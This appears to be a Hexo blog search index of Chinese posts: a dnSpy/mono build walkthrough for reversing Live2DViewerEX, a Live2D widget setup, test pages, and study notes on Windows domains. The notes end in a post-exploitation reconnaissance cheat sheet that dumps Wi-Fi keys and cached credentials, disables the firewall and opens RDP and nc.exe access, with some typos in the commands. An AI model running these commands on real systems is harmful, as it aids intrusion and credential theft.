alt="image-20240718090517082"></p><p>这里时间戳的用处就是比较一下你和在gitk中找到的是否是一致的，如果在那个时间点左右，多少差一点没关系。如果时间跨度很大，那可能是找错了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxx\dnSpy-Unity-mono\src\umpatcher\umpatcher\obj\Debug\net48\umpatcher.exe 2019.4.40-mbe 5c72e2513122ba54eb1dcaef03df123ca1a2809b &quot;C:\Users\90674\mono&quot; &quot;C:\Users\xxx\dnSpy-Unity-mono&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.postimg.cc/JzYVKqhZ/12.png" alt="image-20240718101202860"></p><p>这样就是成功了的</p><p>如果报错为Git working tree is not clean. Check in the modified files. (Repo: C:\Users\xxx\dnSpy-Unity-mono)</p><p>那么在git中去到dnSpy-Unity-mono下运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git status 查看有哪些改变</span><br><span class="line"></span><br><span class="line">使用git reset --hard清除</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line">git commit -m &quot;mono&quot; 提交改变</span><br></pre></td></tr></table></figure><p>然后使用git status再次查看有哪些改变如果没有了，就再尝试使用umpatcher</p><p>如果出现submodule相关问题，那么就使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule update</span><br></pre></td></tr></table></figure><p>进行更新即可</p><p>最后会生成一个unity-2019.4.40-mbe和其他东西在C:\Users\xxx\dnSpy-Unity-mono文件夹下面</p><p><img src="https://i.postimg.cc/XYY6whnn/13.png" alt="image-20240718102328988"></p><p>如果你下面没有dnSpy-Unity-mono-2019.x.sln等文件的话，可能和文件夹里mono.sln有关？这个我不太清除，你们可以看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Users\xxx\dnSpy-Unity-mono\unity-2019.4.40-mbe\msvc\mono.sln&quot;</span><br></pre></td></tr></table></figure><p>有dnSpy-Unity-mono-2019.x.sln等东西的话，可以去直接在vs中生成一下相应的dll</p><p><img src="https://i.postimg.cc/FKft6Lfq/14.png" alt="image-20240718102721723"></p><p>最后dll文件会出现在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxx\dnSpy-Unity-mono\builds\Release\unity-2019.4.40\win64</span><br></pre></td></tr></table></figure><p>现在就完成了生成，接下了就将dll文件替换掉live2DviewerEX现有的同名文件，然后再用dnspy进行逆向即可啦&#x2F;这步我不会(悲)</p><p>参考链接：</p><p><a href="https://www.cnblogs.com/2aptx4869/p/16291513.html">Live2DViewerEX 创意工坊文件解密 - 洛绫璃 - 博客园 (cnblogs.com)</a></p><p><a href="https://chr.fan/lpk-decrypt/">Live2DViewerEX 创意工坊lpk文件分析 - 动态调试Unity程序 - α-Lyraeα-Lyrae (chr.fan)</a></p><p><a href="https://blog.csdn.net/Ricardo0012/article/details/127107350?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127107350-blog-105102733.235%5Ev43%5Epc_blog_bottom_relevance_base2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127107350-blog-105102733.235%5Ev43%5Epc_blog_bottom_relevance_base2&utm_relevant_index=1">【逆向工程】生成能够用dnSpy调试的mono-2.0-bdwgc.dll（一）-CSDN博客</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+buuterfly+Cubism5.0自定义看板娘搭建</title>
      <link href="/posts/f407262d9961/"/>
      <url>/posts/f407262d9961/</url>
      
        <content type="html"><![CDATA[<p>由于我的模型是新模型(SDK5.0&#x2F;Cubism5.0的版本)，文件格式为moc3，github上helper-llive2d是不支持这个内核版本，并且live2d-moc3，所以导致现在网上的一些教程是不匹配的，不能实现这个版本看板娘的搭建</p><p>链接如下：</p><p><a href="https://blog.csdn.net/weixin_44517301/article/details/106348887?ops_request_misc=%7B%22request_id%22:%22172065980216800178579183%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=172065980216800178579183&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-106348887-null-null.142%5Ev100%5Epc_search_result_base3&utm_term=%E4%BD%BF%E7%94%A8hexo%E7%9A%84helper-live2d&spm=1018.2226.3001.4187">Hexo添加Live2D看板娘最新教程_hexo live2d 教程-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_43868299/article/details/108949274?ops_request_misc=%7B%22request_id%22:%22172059240916800188571546%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=172059240916800188571546&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-108949274-null-null.142%5Ev100%5Epc_search_result_base3&utm_term=%E4%BD%BF%E7%94%A8hexo%E7%9A%84helper-live2d&spm=1018.2226.3001.4187">使用Hexo的helper-live2d插件自定义博客看板娘_hexo-helper-live2d-CSDN博客</a></p><p><a href="https://github.com/LitStronger/live2d-moc3">LitStronger&#x2F;live2d-moc3: live2d, 适用于加载新版moc3游戏角色模型(碧蓝航线)。附带使用例子 (github.com)</a></p><p><a href="https://blog.csdn.net/weixin_43641850/article/details/108154098">网页&#x2F;博客Hexo添加live2d游戏角色看板娘,简易添加，碧蓝航线等live2d新型游戏角色模型（moc3）_moc3放网页上-CSDN博客</a></p><p>都不太能符合这个模型，会出现类似于现在的内核版本过低导致模型无法加载的问题</p><p>这个问题是通过解决修改内核解决的</p><p>例如这个大佬的</p><p><a href="https://www.cnblogs.com/Arisf/p/14347362.html">在博客园主页添加一个Live2D moc3 - Arisf - 博客园 (cnblogs.com)</a>，但他的也不能直接用，因为他把内核保存在本地版本没随官方更新，不是5.0的，我们只需要修改这一部分就行</p><p>不嫌弃的话，可以直接用我的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/xudamu/Doro@3/bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//存在我项目里的启动器的js</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cubism.live2d.com/sdk-web/cubismcore/live2dcubismcore.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    //官方的最新内核</span><br></pre></td></tr></table></figure><p>添加在</p><p><img src="https://i.postimg.cc/66Pk2t8q/image.png" alt="img"></p><p>我这个是buuterfly主题，原理上你只需要保证其能插入到你的文档中就行(头部加载)，就是个启动器和内核的js</p><p>然后再文本中插入你的canvas</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas id=&quot;live2d&quot; width=&quot;400&quot; height=&quot;400&quot; class=&quot;live2d&quot; style=&quot;position: fixed; opacity: 1; left: -110px; bottom: -135px; z-index: 99999; pointer-events: none;&quot;&gt;&lt;/canvas&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;  </span><br><span class="line">var resourcesPath = &#x27;https://cdn.jsdelivr.net/gh/Arisf0617/ATRI@v1.0/&#x27;; // 指定资源文件（模型）保存的路径，使用github的release版本，路径如下https://cdn.jsdelivr.net/gh/用户/库@版本号/资源路径</span><br><span class="line">var backImageName = &#x27;&#x27;; // 指定背景图片 ,默认为空</span><br><span class="line">var modelDir = [&#x27;ATRI&#x27;]; // 指定需要加载的模型</span><br><span class="line">initDefine(resourcesPath, backImageName, modelDir); // 初始化模型&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我这里是将resourcepath和modeldir改了，并作一行写入bottom就行</p><p>保存然后</p><p>hexo clean;hexo g;hexo s在本地看看效果，模型加载较慢是正常现象，得等会。如果有好的方法欢迎讨论，我也想知道，别逼我求你(✿◕‿◕✿)</p><p>我这里是将模型传到了github上创建了release，就能在<a href="https://cdn.jsdelivr.net/gh/%E7%94%A8%E6%88%B7/%E5%BA%93@%E7%89%88%E6%9C%AC%E5%8F%B7/%E8%B5%84%E6%BA%90%E8%B7%AF%E5%BE%84">https://cdn.jsdelivr.net/gh/用户/库@版本号/资源路径</a>    进行访问了，这里的版本号是你创建release时加的tag</p><p>快去试试吧！</p>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxx</title>
      <link href="/posts/c76cf8828a3b/"/>
      <url>/posts/c76cf8828a3b/</url>
      
        <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><p>代码测试：<br>`&#96;&#96;py<br>print(“Hello”)<br>`&#96;&#96;</p><p>注意：这里因为我放在md文件中的，所以加上了\，不解析&#96;&#96;&#96;，实际测试时请去掉\。</p><p>图片测试：</p><p><img src="http://mculover666.cn/blog/20191031/R4mWMXsrRKxu.png?imageslim"></p><p>引用测试：</p><blockquote><p>这是一条引用</p></blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>无序列表测试：</p><ul><li>哈哈</li><li>嘿嘿</li><li>吼吼</li></ul><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>]]></content>
      
      
      
        <tags>
            
            <tag> caosuan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试博客</title>
      <link href="/posts/d557603f916a/"/>
      <url>/posts/d557603f916a/</url>
      
        <content type="html"><![CDATA[<h1 id="超算测试第一博客"><a href="#超算测试第一博客" class="headerlink" title="超算测试第一博客"></a>超算测试第一博客</h1><h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>姓名：许</p><p>性别：男</p><p>喜好：无特别，但打游戏、小说、漫画、番剧轮流占用时间</p><p>特长：暂无</p><p>自我评价：还行，吼吼</p><p>github:<a href="http://www.github.com/xudamu">www.github.com/xudamu</a></p><h3 id="下面是截取的另外的笔记"><a href="#下面是截取的另外的笔记" class="headerlink" title="下面是截取的另外的笔记"></a>下面是截取的另外的笔记</h3><h1 id="内网介绍"><a href="#内网介绍" class="headerlink" title="内网介绍"></a>内网介绍</h1><p>内部局域网，可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮箱和传真通信服务等</p><p><img src="https://i.postimg.cc/TwJnHJDH/image.png" alt="img"></p><p>除了DMZ区一个web服务器或什么服务器上挖漏洞外，我们还可以，打印机、摄像头、路由器、智能电视？外来接入加入的路由器，通过流量劫持获取账号密码或者是强制分配IP都可以进入内网</p><p>钓鱼远控、提供路由器、攻击子公司、社工插U盘等都可以攻入内网</p><h2 id="工作组介绍"><a href="#工作组介绍" class="headerlink" title="工作组介绍"></a>工作组介绍</h2><p>按照不同职能对计算机进行分组</p><h4 id="加入工作组"><a href="#加入工作组" class="headerlink" title="加入工作组"></a>加入工作组</h4><p>计算机属性中找到工作组，添加即可</p><p><img src="https://i.postimg.cc/dt6wtk2P/image2.png" alt="img"></p><p><img src="https://i.postimg.cc/3w4TBtPY/image3.png" alt="img"></p><h4 id="创建工作组"><a href="#创建工作组" class="headerlink" title="创建工作组"></a>创建工作组</h4><h4 id="退出工作组"><a href="#退出工作组" class="headerlink" title="退出工作组"></a>退出工作组</h4><p><img src="https://i.postimg.cc/3w4TBtPY/image4.png" alt="img"></p><p>把下面改掉即可，改成想要的，点击确定就能创建</p><h4 id="访问工作组"><a href="#访问工作组" class="headerlink" title="访问工作组"></a>访问工作组</h4><p>点击即可</p><h4 id="工作组的优缺点"><a href="#工作组的优缺点" class="headerlink" title="工作组的优缺点"></a>工作组的优缺点</h4><p>优点：方便管理、资源分配灵活</p><p>缺点： 缺乏集中管理与控制的机制、没有集中的统一账户管理、只适合小规模用户使用</p><h2 id="域介绍"><a href="#域介绍" class="headerlink" title="域介绍"></a>域介绍</h2><p>解决上面工作组没有统一管理的缺陷，由域控制器管理域。连接域需要登录域的账号密码，而域的账号密码都在域控制器中</p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>通常在地理位置固定的小公司中，一个域就能满足需求，但是在一个域汇内，一般有两台域控制器，一台作为DC、另一台作为备份DC(域控制器)</p><p>同时一般来说DC和DNS会是同一台服务器，这种情况会比较多</p><h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>第一个域就是父域，下面就是他的子域</p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>总个父域和子域就是域树</p><h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>就是多个域树</p><h3 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h3><p>。。。</p><h3 id="活动目录介绍"><a href="#活动目录介绍" class="headerlink" title="活动目录介绍"></a>活动目录介绍</h3><p>活动目录(AC&#x2F;Active Directory AD)是指域环境中提供目录服务的组件</p><p>可以在user中添加想要的权限</p><p><img src="https://i.postimg.cc/Vv1Pzm5k/image5.png" alt="img"></p><h3 id="域内权限介绍"><a href="#域内权限介绍" class="headerlink" title="域内权限介绍"></a>域内权限介绍</h3><p>这里后面都有描述的，直接将用户添加到相应的位置就可以</p><p>在创建用户的时候可以设置相关用户参数</p><p>做</p><p>账号集中管理：所有账号均存储在服务器中，方便执行命令和重置密码</p><p>软件集中管理：统一推送软件、安装网络打印机等、利用软件发布策略分发软件、可以让用户自由选择需要的软件</p><p>环境集中管理：统一客户端、iE、TCPP协议等设置。增强安全性：统一部署蛇毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等、可以监控网络，对资料进行统一管理</p><p>更可靠，更短的宕机时间：例如，利用活动目录控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠，宕机时间更短</p><p>活动目录是微软提供的统一管理基础平台，ISA、Exchange、SMS等都依赖这个平台</p><p>组里面还可以加组</p><p><img src="https://i.postimg.cc/yYtnRnXF/image6.png" alt="img"></p><p>创建组内的组来控制组内用户的管理权限</p><h4 id="域内权限详细"><a href="#域内权限详细" class="headerlink" title="域内权限详细"></a>域内权限详细</h4><h5 id="组"><a href="#组" class="headerlink" title="组"></a>组</h5><p>组是用户账号的集合、通过向组分配权限，就可以不必向每个用户分别分配权限，方便管理</p><h5 id="域本地"><a href="#域本地" class="headerlink" title="域本地"></a>域本地</h5><p>域本地成员来自林中任何域中的用户账号、全局组和通用组以及本域中的域本地组，在本域范围内可用，是权限的划分组</p><h5 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h5><p>成员来自同一域的用户账户和全局组，在林范围内可用。是用户的集合组</p><h5 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h5><p>来自于林中任意于中的用户账户、全局组和其他通用组，在全林范围内可用</p><p>DYJ为打印机</p><p><img src="https://i.postimg.cc/vZnht93C/image7.png" alt="img"></p><p><img src="https://i.postimg.cc/d1s9FfwK/image8.png" alt="img"></p><p>A-G-DL-P策略</p><p>指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分派资源权限</p><p>A表示用户账号(Account)</p><p>G表示全局组</p><p>U表示通用组</p><p>DL表示域本地组</p><p>P表示资源权限</p><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><p>目的是将一组安全等级相同的计算机划入同一网段。该网段的计算机拥有相同的网络边界、并在网络边界上部署防火墙来实现对其他安全域的网络访问控制策略，从而对允许哪些IP地址访问此域、允许此域访问哪些IP地址和网段进行设置。这些措施将网络风险最小化，当攻击发生时，可尽可能将威胁隔离，从而降低对域内计算机的影响。</p><p><img src="https://i.postimg.cc/mg3MrSdZ/image9.png" alt="img"></p><p>多层隔离</p><p>DMZ是放在公网上的，一般DMZ是不让访问内网的，防止DMZ的服务器被打崩当跳板跳入内网中</p><h3 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h3><h4 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h4><p>用于管理所有网络访问，有所有的共享目录和资源。域控制器中存储了域内所有的账户和策略信息，包括安全策略、用户身份验证信息和账户信息</p><p>有多台计算机可以被指定为域控制器，以分据用光的登录、访问等操作，多个域控制器可以一起工作，自动备份用户账户和活动目录数据。这样及时部分域控制器瘫痪，访问也不会受到影响</p><h4 id="成员服务器"><a href="#成员服务器" class="headerlink" title="成员服务器"></a>成员服务器</h4><p>成员服务器是指定安装了服务器操作系统并加入了域、但是没有安装活动目录的计算机，其主要任务是提供网络资源，成员服务器的类型通常由文件服务器、应用服务器、数据库服务器、web服务器、防火墙、远程访问服务器、打印服务器</p><h4 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h4><p>域中计算机可以是安装了其他操作系统的计算机，用户利用这些计算机和域中的账户可以登录域。这些计算机被称为域中的客户机。域用户账号通过域的安全验证后，即可访问域中的各种资源</p><h4 id="独立服务器"><a href="#独立服务器" class="headerlink" title="独立服务器"></a>独立服务器</h4><p>独立服务和域没有关系，如果服务器不加入域，也不安装活动目录，称为独立服务器。独立服务器可以创建工作组、与网络中其他计算机共享资源，但不用活动目录提供的任何服务</p><p>域控制器用于有放活动目录数据库，是域中必须要有的，而其他三种计算机则不要必须要有的，也就是说，最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。当然，域中各服务器的角色是可以改变的。例如，独立服务器既可以称为域控制器，也可以加入某个域成为成员服务器</p><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>内网信息、本机信息、内网IP、内网端口、域信息、域内用户</p><p>建立在创建了内网权限后。上线CS或msf后</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h4 id="手动收集内网信息"><a href="#手动收集内网信息" class="headerlink" title="手动收集内网信息"></a>手动收集内网信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">systeminfo | findstr /B /C:&quot;名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p>查看系统体系结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p>查看安装的软件以及版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line">powershell &quot;Get-WmiObject -class win32_product | Select-Object name,version&quot;</span><br></pre></td></tr></table></figure><p>查看本机的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p>进程信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p>启动程序信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p>计划任务信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schttasks /query /fo LIST /v</span><br><span class="line">如果上面的命令显示无法载入列资源，那么输入：chcp 437</span><br></pre></td></tr></table></figure><p>主机开机时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p>查用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">wmic useraccount get name ,SID</span><br></pre></td></tr></table></figure><p>查会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><p>查端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p>查补丁</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,Installedon</span><br></pre></td></tr></table></figure><p>查看共享列表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share <span class="operator">/</span><span class="operator">/</span>横向移动？</span><br><span class="line">wmic share <span class="keyword">get</span> name, path,status</span><br></pre></td></tr></table></figure><p>查询路由信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><p>查看防火墙是否开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="keyword">show</span> state <span class="operator">/</span><span class="operator">/</span>虽然说netsh firewall已经过时了，改成了netsh advfirewall firewall <span class="keyword">show</span> state无法执行</span><br></pre></td></tr></table></figure><p>关闭防火墙</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在windows2003前：netsh firewall <span class="keyword">set</span> opmode disable</span><br><span class="line">在windows2003之后：netsh firewall <span class="keyword">set</span> opmode disable 或者 netsh advfirewall <span class="keyword">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p>查看防火墙配置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="keyword">show</span> config</span><br></pre></td></tr></table></figure><p>修改防火墙配置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windowserver2003之前：netsh firewall <span class="keyword">add</span> allowedprogram c:\nc.exe &quot;allownc&quot; enable <span class="operator">/</span><span class="operator">/</span>指定nc.exe能连接(出防火墙)</span><br><span class="line">windowserver2003之后：netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>&quot;pass nc&quot;dir<span class="operator">=</span><span class="keyword">in</span> action<span class="operator">=</span>allow program<span class="operator">=</span>&quot;c:/nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许端口放行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>&quot;RemoteDesktop&quot; protocol<span class="operator">=</span>TCP dir<span class="operator">=</span><span class="keyword">in</span> localport<span class="operator">=</span><span class="number">3389</span> action<span class="operator">=</span>allow</span><br></pre></td></tr></table></figure><p><img src="https://yxr37qkcj7k.feishu.cn/space/api/box/stream/download/asynccode/?code=NWE4NmY1NzE2OTYzNDhiMzUwODUyODViY2FmMWIzNjNfYndSQ3o1N0NWS3plN1lWNEtreVlNNTc5M1o5dUh4c09fVG9rZW46UmVXc2Joejc4b0NtOVp4eU9ZdWMwU1pBbjJmXzE3MjA1NjU2MzA6MTcyMDU2OTIzMF9WNA" alt="img"></p><p>允许端口进站</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>test dir<span class="operator">=</span><span class="keyword">in</span> action<span class="operator">=</span>allow protocol<span class="operator">=</span>tcp localport<span class="operator">=</span><span class="number">4444</span>#允许端口进站</span><br></pre></td></tr></table></figure><p>允许端口出站</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>test dir<span class="operator">=</span><span class="keyword">out</span> action<span class="operator">=</span>allow protocol<span class="operator">=</span>tcp localport<span class="operator">=</span><span class="number">4444</span>#允许端口进站</span><br></pre></td></tr></table></figure><p>允许程序入站</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>test dir<span class="operator">=</span><span class="keyword">in</span> action<span class="operator">=</span>allow program<span class="operator">=</span>c:<span class="operator">/</span><span class="operator">/</span>a.exe</span><br></pre></td></tr></table></figure><p>出站类似</p><p>开启远程服务</p><p>在2003机器上</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting <span class="keyword">where</span> (_CLASS <span class="operator">!=</span>&quot;&quot;) <span class="keyword">call</span> setallowtsconnections <span class="number">1</span></span><br></pre></td></tr></table></figure><p>在server2008和server 2021</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG <span class="keyword">ADD</span> HKLM\<span class="keyword">SYSTEM</span>\CurrentControlSet\Control\Terminal&quot; &quot;Server <span class="operator">/</span>v fDenyTSConnections <span class="operator">/</span>t TEG_DWORD <span class="operator">/</span>d <span class="number">00000000</span> <span class="operator">/</span>f</span><br><span class="line">REG <span class="keyword">ADD</span> HKLM\<span class="keyword">SYSTEM</span>\CurrentControlSet\Control\Terminal&quot; &quot;Server <span class="operator">/</span>v fDenyTSConnections <span class="operator">/</span>t TEG_DWORD <span class="operator">/</span>d <span class="number">11111111</span> <span class="operator">/</span>f</span><br></pre></td></tr></table></figure><p>查wifi密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>f &quot;skip=9 tokens=1,2 delims=:&quot; <span class="operator">%</span>i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>) do <span class="variable">@echo</span> <span class="operator">%</span>j <span class="operator">|</span> findstr <span class="operator">-</span>i <span class="operator">-</span>v echo <span class="operator">|</span> netsh wlan <span class="keyword">show</span> profiles <span class="operator">%</span>j key<span class="operator">=</span>clear</span><br></pre></td></tr></table></figure><p>查看RDP(远程桌面协议)端口号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp&quot; <span class="operator">/</span>v PortNumber</span><br></pre></td></tr></table></figure><p>查代理信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Wicrosoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><p>查看登录凭证     &#x2F;&#x2F;可能有人将管理凭证缓存，然后这里就能看到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey <span class="operator">/</span>list</span><br></pre></td></tr></table></figure><p>查看arp信息，查看地址存活</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp <span class="operator">-</span>a</span><br></pre></td></tr></table></figure><p>查看本机用户组</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><p>查看最近打开的文档</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="operator">%</span>APPDATA<span class="operator">%</span>\Microsoft\Windows\Recent</span><br></pre></td></tr></table></figure><p>查看本机用户组（windows11家庭版好像只能这么干）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><p>查看管理员组成员</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h4 id="自动收集脚本"><a href="#自动收集脚本" class="headerlink" 